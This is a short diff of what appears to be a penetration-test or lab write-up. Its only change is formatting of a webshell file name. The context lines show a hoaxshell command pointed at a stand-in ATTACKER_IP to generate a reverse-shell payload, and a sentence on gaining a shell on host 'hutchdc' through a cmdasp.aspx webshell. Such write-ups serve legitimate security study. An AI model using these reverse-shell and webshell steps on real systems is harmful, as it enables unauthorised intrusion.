@@ -173,7 +173,7 @@ pip install -r hoaxshell/requirements.txt
 python3 hoaxshell/hoaxshell.py -s ATTACKER_IP
 ```
 
-Pasting the generated reverse shell payload in the cmdasp.aspx webshell resulted in a low level interactive shell as user `iis apppool\defaultapppool` on `hutchdc`.
+Pasting the generated reverse shell payload in the `cmdasp.aspx` webshell resulted in a low level interactive shell as user `iis apppool\defaultapppool` on `hutchdc`.
 
 ---
 
